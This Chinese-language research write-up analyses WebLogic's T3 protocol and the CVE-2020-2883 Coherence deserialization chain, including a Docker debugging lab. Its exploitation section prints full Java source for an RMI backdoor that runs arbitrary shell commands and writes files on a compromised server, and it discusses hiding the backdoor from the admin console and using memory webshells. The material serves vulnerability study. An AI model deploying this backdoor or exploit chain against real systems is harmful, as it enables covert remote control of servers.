---
sidebar_position: 3
---

# Weblogic t3协议分析

## 漏洞介绍
weblogic反序列化漏洞大致有两种，一种是基于t3协议的，一种是基于xml的

基于T3协议漏洞大致有： CVE-2015-4582、CVE-2016-0638、CVE-2016-3510、CVE-2018-2628、CVE-2020-2555、CVE-2020-2883

其中CVE-2020-2883是CVE-2020-2555补丁的绕过，实则差不多

## 调试环境搭建
本篇测试CVE-2020-2883漏洞使用docker搭建环境

使用vulfocus/weblogic-cve_2020_2883镜像（weblogic:12.1.3）、idea远程调试

docker-compose.yml配置如下

```Groovy
version: '2'
services:
 weblogic:
   image: vulfocus/weblogic-cve_2020_2883:latest
   ports:
    - "7001:7001"
    - "8453:8453"
```

然后docker-compose up -d启动镜像，

再docker exec -it <镜像ID> /bin/bash，进入容器shell `vi /u01/oracle/weblogic/user_projects/domains/base_domain/bin/setDomainEnv.sh`

搜索debugFlag

在if上添加

```
debugFlag="true"
export debugFlag
```

如图

![](/img/products/yakit/weblogic-debugFlag.png)

然后:wq保存，exit退出容器`docker restart <容器id>`重启容器，服务端调试环境就搭建好了

还有个问题就是，本地调试需要远程运行项目的jar包或源码，可以直接dokcer cp从镜像里把jar包都拿出来，但是下载速度太慢了，我选择本机在官网下载weblogic12.1.3的安装包，然后解压，把.jar后缀的放到一个文件夹下，当做依赖

在本地打开idea，创建空项目，然后将上面整理好的文件夹，设置为依赖，如图

![](/img/products/yakit/weblogic-create.png)

再设置远程调试，如图

![](/img/products/yakit/weblogic-remote.png)

这样调试环境就搭建好了
  
漏洞测试exp用的是[GitHub - Y4er/CVE-2020-2883: Weblogic coherence.jar RCE](https://github.com/Y4er/CVE-2020-2883)，运行前修改地址和端口

服务端启动docker后，本地idea开启调试，就可以连接到服务端  
然后在wlthint3client.jar!/weblogic/rjvm/InboundMsgAbbrev.class#read处加断点，如图

![](/img/products/yakit/weblogic-docker.png)

在此处就可以看见反序列化流程了

## t3协议组成分析
首先在发出t3协议数据包之前，要先发一个header，例：`t3 10.3.1\nAS:255\nHL:19\n\n10.3.1`是本地客户端请求，`AS`是abbrevs的大小，`HL`是header长度

发送完header后再发送t3协议数据包就可以被解析了

abbrevs是一个栈，反序列化出来的对象被叫做abbrev，都会push进去，abbrev分三种，一种是普通的Object，一种是ImmutableObject，一种是ImmutableServiceContext，这三种Object前面都会有个前缀，区别是ImmutableObject类型是ClassTableEntry，有个ObjectStreamClass类型的成员属性descriptor（在反序列化时会先读取descriptor，再通过它创建一个空类，在设置field的值。所以ImmutableObject也可以粗略理解为是类的描述）,ImmutableServiceContext对象就是ImmutableServiceContext类型，有个MethodDescriptor类型的data成员属性，data有个signature属性，如图（ImmutableServiceContext可以理解为方法的描述）

![](/img/products/yakit/weblogic-ImmutableServiceContext.png)

一个完整的t3协议，大概包含header（数据包的header，和上面的header不同）、peerinfo、abbrevs
拿一次lookup的请求举例，如图

![](/img/products/yakit/weblogic-lookup.png)

前19个字节是header，解析header过程如图

![](/img/products/yakit/weblogic-lookup-header.png)

其中cmd表示请求类型，flags如上图，如果为1则hasJVMIDs为true，为2则hashTX为true，responseId在服务端的响应中会将请求的id加一返回，invokeableId表示远程调用方法的id，abbrevOffset：abbrevs的位置（abbrev这个结构就是前缀加序列化对象）

header后数据如图

![](/img/products/yakit/weblogic-lookup-header-1.png)

2之前，主要包括“一部分信息”和对象的field，readClassDescriptor方法在MsgAbbrevInputStream类中被重写了，在反序列化时，会从abbrevs中取Class的desc（开头提到的ImmutableObject）。再说这“一部分信息”，如果是context请求，这部分信息就是Publickey(这部分逻辑在这个方法wlthint3client.jar!/weblogic/rjvm/ConnectionManagerServer.class#handleIdentifyRequest)。如果是其它请求，这部分信息就是控制从abbrevs中读取ServiceContext对象的几个字节（这部分逻辑在这个方法wlthint3client.jar!/weblogic/rjvm/MsgAbbrevInputStream.class#readExtendedContexts）

2后面的字节是`fe010000`，然后才是aced（序列化对象的开头），暂且叫`fe010000`为前缀吧

如图是解析abbrevs的方法in.readLength()读取的就是fe0100，当大于at.getCapacity()（header请求中AS的值）时才会反序列化后面的数据，否则就会at.getValue()（这个方法一般返回的是null）

![](/img/products/yakit/weblogic-abbrevs.png)

readLength方法如下图，当第一个字节的值是254（16进制的fe）时，会继续读两个字节：0100，转10进制就是256，刚好大于AS的值255，所以可以反序列化

![](/img/products/yakit/weblogic-readLength.png)

readObject方法如图，会读取一个对象类型的标志

![](/img/products/yakit/weblogic-readObject.png)

所以前缀由一个length和对象类型标志组成，如果想反序列化，这个标志需要为0

其实可以将AS值设置小一点，如253以下，这个前缀`fe010000`就可以改为`fd00`了

t3协议解析流程是先读header，得到abbrevsOffest后解析abbrevs（反序列化），读取Publickey或extendedContext、peerinfo

## 漏洞利用
### 反序列化
知道了t3协议组成，那反序列化利用就简单了，先发送header，再发一段恶意t3数据包：header+前缀+序列化对象

然后就是利用链的构造，weblogic有个Coherence组件，官方介绍是这样的

![](/img/products/yakit/weblogic-Coherence.png)

这个组件的ReflectionExtractor类，类似CC链的中的Transformer，它可以通过反射调用某个对象的方法，而且也可以通过ChainedExtractor，串联多个ReflectionExtractor

同在Coherence组件的LimitFilter类的toString方法，调用了extractor.extract，如图

![](/img/products/yakit/weblogic-LimitFilter.png)

### 回显利用
因为ReflectionExtractor可以调用任意对象的任意方法，所以可以构造TemplatesImpl实现代码执行，https://github.com/Y4er/CVE-2020-2555 项目安装rmi的payload利用链是AnnotationInvocationHandler ->LazyMap->Transformer然后defineClass，再invoke

但如果不出网就需要回显利用，通过反序列化，可以代码执行，所以可以通过java代码，实现一个带回显的后门

后门需要用一个端口传递消息，直接监听个新端口大概率也是在内网，所以最好还是用中间件自身的功能，通过已经开启了端口的服务实现后门，例如注册一个恶意rmi对象，利用t3协议远程调用

注册恶意rmi后门代码如下（这个后门可以上传，安装和卸载）

```JAVA
package com.supeream.payload;

import java.io.BufferedReader;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.rmi.RemoteException;
import java.util.ArrayList;
import java.util.List;
import javax.naming.Context;
import javax.naming.InitialContext;
import weblogic.cluster.singleton.ClusterMasterRemote;

public class RemoteImpl implements ClusterMasterRemote {
    public RemoteImpl() {
    }

    public static void main(String[] args) {
        try {
            RemoteImpl remote = new RemoteImpl();
            if (args.length == 2 && args[0].equalsIgnoreCase("blind")) {
                remote.getServerLocation(args[1]);
            } else if (args.length == 1) {
                Context ctx = new InitialContext();
                if (args[0].equalsIgnoreCase("install")) {
                    ctx.rebind("supeream", remote);
                } else if (args[0].equalsIgnoreCase("uninstall")) {
                    ctx.unbind("supeream");
                }
            }
        } catch (Exception var3) {
        }

    }

    public void setServerLocation(String cmd, String args) throws RemoteException {
    }

    public static void uploadFile(String path, byte[] content) {
        try {
            FileOutputStream fileOutputStream = new FileOutputStream(path);
            fileOutputStream.write(content);
            fileOutputStream.flush();
            fileOutputStream.close();
        } catch (Exception var3) {
        }

    }

    public String getServerLocation(String cmd) throws RemoteException {
        try {
            if (!cmd.startsWith("showmecode")) {
                return "guess me?";
            } else {
                cmd = cmd.substring(10);
                boolean isLinux = true;
                String osTyp = System.getProperty("os.name");
                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                    isLinux = false;
                }

                List<String> cmds = new ArrayList();
                if (cmd.startsWith("$NO$")) {
                    cmds.add(cmd.substring(4));
                } else if (isLinux) {
                    cmds.add("/bin/bash");
                    cmds.add("-c");
                    cmds.add(cmd);
                } else {
                    cmds.add("cmd.exe");
                    cmds.add("/c");
                    cmds.add(cmd);
                }

                ProcessBuilder processBuilder = new ProcessBuilder(cmds);
                processBuilder.redirectErrorStream(true);
                Process proc = processBuilder.start();
                BufferedReader br = new BufferedReader(new InputStreamReader(proc.getInputStream()));
                StringBuffer sb = new StringBuffer();

                String line;
                while((line = br.readLine()) != null) {
                    sb.append(line).append("\n");
                }

                return sb.toString();
            }
        } catch (Exception var10) {
            return var10.getMessage();
        }
    }
}
```

利用payload绑定了恶意rmi后，就可以调用后门了，大概有获取context，lookup，invoke三个步骤，为了脱离java语言依赖，需要手动构造t3协议，每次请求主要可以分为三部分header、peerinfo、序列化对象

服务端解析t3协议时，通过hasJVMIDs判断是否需要读取JVMID，authentication必须读取，如图

![](/img/products/yakit/weblogic-hasJVMIDs.png)

authentication可以为null(上文有截图，令前缀的length小于at.getCapacity()即可)

context组成：ClassTableEntry(PackageInfo)、ClassTableEntry(VersionInfo)、ClassTableEntry(PeerInfo),authentication,jvmid,jvmid（PackageInfo 是VersionInfo 的父类，VersionInfo 是PeerInfo的父类）

lookup组成：ImmutableServiceContext(methodDescript("getNameInNamespace()"))，authentication

invoke组成：ImmutableServiceContext(methodDescript("getServerLocation(Ljava.lang.String;)"))，authentication

如图是header、context、lookup的请求

![](/img/products/yakit/weblogic-lookup-request.png)

通过反序列化代码执行安装rmi后门，然后调用远程方法，即可实现回显，但这种方法注册的rmi后门在控制台可以明显看见（我觉得可以看下bind方法执行流程，和console如何获取已注册的rmi，想办法只让后门生效，但不会在console显示）

除此之外，还可以写内存马，利用80端口回显（这种方式更隐蔽些），weblogic内存马代码在上一篇反序列化分析中贴过了

